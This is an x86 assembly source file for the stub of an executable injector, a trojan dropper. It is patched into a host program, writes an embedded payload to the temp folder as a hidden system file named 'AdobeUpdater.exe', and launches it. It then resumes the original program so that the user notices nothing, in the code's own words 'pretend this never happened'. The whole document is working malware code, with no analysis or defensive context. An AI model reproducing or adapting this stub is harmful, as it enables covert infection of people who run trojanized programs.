org 0

[bits 32]

; these are filled in by the injector patcher

GetProcAddress dd 0
LoadLibraryA   dd 0

payloadOffset dd 0
payloadSize   dd 0

entryPoint    dd 0	; this is the original entry point

db 0,0,0 ; for alignment of the first instruction for the patcher in the injector

start:

	mov eax, 0xDEADBEEF ; this will actually be replaced by injector patcher with the absolute virtual address of this section
	
	; preserve original registers (except eax)
	
	push edi
	push esi
	push ebp
	push ebx
	push edx
	push ecx
	
	mov ebp, eax        ; use ebp as our addressing base for stub data
	
	; load kernel32.dll and store module handle
	
	lea eax, [ebp + kernelLibName]
	push eax
	mov eax, [ebp + LoadLibraryA]
	call [eax]
	
	test eax,eax
	jz bailout
	mov [ebp + kernelModule], eax
	
	; get the address of some useful functions in it and store them
	
	lea eax, [ebp + createFileName]
	push eax
	mov eax, [ebp + kernelModule]
	push eax
	mov eax, [ebp + GetProcAddress]
	call [eax]
	
	test eax,eax
	jz bailout	
	mov [ebp + CreateFile], eax
	
	lea eax, [ebp + writeFileName]
	push eax
	mov eax, [ebp + kernelModule]
	push eax	
	mov eax, [ebp + GetProcAddress]
	call [eax]
	
	test eax,eax
	jz bailout	
	mov [ebp + WriteFile], eax
	
	lea eax, [ebp + closeHandleName]
	push eax
	mov eax, [ebp + kernelModule]
	push eax	
	mov eax, [ebp + GetProcAddress]
	call [eax]
	
	test eax,eax
	jz bailout	
	mov [ebp + CloseHandle], eax
	
	lea eax, [ebp + createProcessName]
	push eax
	mov eax, [ebp + kernelModule]
	push eax	
	mov eax, [ebp + GetProcAddress]
	call [eax]
	
	test eax,eax
	jz bailout	
	mov [ebp + CreateProcess], eax
	
	lea eax, [ebp + expandEnvironmentStringsName]
	push eax
	mov eax, [ebp + kernelModule]
	push eax	
	mov eax, [ebp + GetProcAddress]
	call [eax]
	
	test eax,eax
	jz bailout	
	mov [ebp + ExpandEnvironmentStrings], eax
	
	; construct path for temporary copy
	
	push DWORD 64
	lea eax, [ebp + tempFilePath]
	push eax
	lea eax, [ebp + tempEnvironmentString]
	push eax	
	mov eax, [ebp + ExpandEnvironmentStrings]
	call eax
	
	; create temporary copy of payload
	
	push DWORD 0    ; no template file
	push DWORD 0x06	; hidden, system file
	push DWORD 0x02 ; always create new file if possible
	push DWORD 0    ; no security attributes
	push DWORD 0    ; no sharing with other processes permitted
	push DWORD 0x40000000 ; write access
	lea eax, [ebp + tempFilePath]
	push eax
	mov eax, [ebp + CreateFile]
	call eax
	
	test eax, eax
	jz bailout
	mov [ebp + tempFile], eax
	
	push DWORD 0 ; no overlapped i/o
	lea eax, [ebp + numBytesWritten]
	push eax     ; updated with number of bytes written
	mov eax, [ebp + payloadSize]
	push eax     ; number of bytes to write
	mov eax, [ebp + payloadOffset]
	push eax     ; address of input buffer
	mov eax, [ebp + tempFile]
	push eax     ; file handle
	mov eax, [ebp + WriteFile]
	call eax
	
	test eax, eax
	jz bailout
	
	mov eax, [ebp + numBytesWritten]
	mov ebx, [ebp + payloadSize]
	cmp eax, ebx
	jne bailout
	
	mov eax, [ebp + tempFile]
	push eax
	mov eax, [ebp + CloseHandle]
	call eax
	
	test eax, eax
	jz bailout
	
	; execute it
	
	lea eax, [ebp + processInformation]
	push eax
	lea eax, [ebp + processStartupInfo]
	push eax
	push DWORD 0 ; current directory (default)
	push DWORD 0 ; environment (default)
	push DWORD 0 ; normal process priority
	push DWORD 0 ; don't inherit handles
	push DWORD 0 ; null security attributes for thread
	push DWORD 0 ; null security attributes for process
	push DWORD 0 ; null command line
	lea eax, [ebp + tempFilePath]
	push eax     ; application name
	mov eax, [ebp + CreateProcess]
	call eax
	
	; close kernel32.dll
	
	mov eax, [ebp + kernelModule]
	push eax
	mov eax, [ebp + CloseHandle]
	call eax
	
	; head back to the actual app
	
bailout:
	
	mov eax, [ebp + entryPoint] ; load the address of the original entry point into eax
	
	; restore original registers including stack pointer
	
	pop ecx
	pop edx
	pop ebx
	pop ebp
	pop esi
	pop edi
	
	jmp eax					; pretend this never happened and start the actual host exe
	
; data

kernelLibName db "KERNEL32.dll",0
kernelModule  dd 0

createFileName db "CreateFileA",0
CreateFile     dd 0

writeFileName db "WriteFile",0
WriteFile	  dd 0		

closeHandleName db "CloseHandle",0
CloseHandle	    dd 0

createProcessName db "CreateProcessA",0
CreateProcess	  dd 0

expandEnvironmentStringsName db "ExpandEnvironmentStringsA",0
ExpandEnvironmentStrings	 dd 0

tempEnvironmentString db "%temp%\\AdobeUpdater.exe", 0
tempFilePath dd 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

tempFile dd 0
numBytesWritten dd 0

processInformation dd 0,0,0,0

processStartupInfo dd 68,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

; payload actually begins here